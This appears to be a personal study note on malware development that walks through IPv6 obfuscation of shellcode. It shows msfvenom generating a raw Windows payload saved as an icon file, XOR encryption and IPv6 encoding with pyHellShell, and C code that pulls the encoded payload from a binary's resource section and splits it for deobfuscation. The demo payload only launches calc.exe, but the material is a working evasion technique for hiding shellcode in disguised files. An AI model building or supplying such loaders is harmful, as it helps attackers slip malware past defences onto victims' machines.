# IPv6 Deobfuscation 

- Main code from maldev - not putting the code here since it's their IP. 

pyHellShell 
```bash
└─# msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o calc.ico

└─# python3 pyHellShell.py -i ~/homelab/calc.ico -e xor -k microsoft -f raw -out ~/homelab/calc_enc.ico -o ipv6
```

C - `.rsrc` 
```c
# Split .rsrc ipv6 into bytes 
void SplitIPv6Array(char* payload, char* resultArray[], SIZE_T* numberOfElements) {
    SIZE_T index = 0;
    char* token = strtok(payload, ",");  // _CRT_SECURE_NO_WARNING 

    if (!token) {
        printf("[!] No valid IPv6 addresses found in payload.\n");
        return;
    }

    while (token != NULL) {
        resultArray[index++] = token;
        token = strtok(NULL, ",");
    }

    *numberOfElements = index;
}
```

C - main 
```c
// Grab payload from the .rsrc section using find+load+lock+sizeof resource winapis... 

// Copy the payload into writable memory
unsigned char* writablePayload = (unsigned char*)malloc(sPayloadSize + 1);  // +1 for null terminator
if (writablePayload == NULL) {
    perror("malloc failed");
    return -1;
}
memcpy(writablePayload, pPayloadAddress, sPayloadSize);
writablePayload[sPayloadSize] = '\0';  // Null terminate the copied data

SIZE_T numberOfElements = 0;
char* ipv6Array[50000];  // Hardcoding 50000 for now, change to w/e 

// Split .rsrc payload into ipv6 arrays 
SplitIPv6Array((char*)writablePayload, ipv6Array, &numberOfElements);

PBYTE pDeobfuscatedBuffer = NULL;
SIZE_T sDeobfuscatedSize = 0;

// Use the maldev academy's ipv6 deobfuscation code 
if (!Ipv6Deobfuscation(ipv6Array, numberOfElements, &pDeobfuscatedBuffer, &sDeobfuscatedSize)) {
    dprintf("[!] Ipv6Deobfuscation failed.\n");
    return -1;
}
```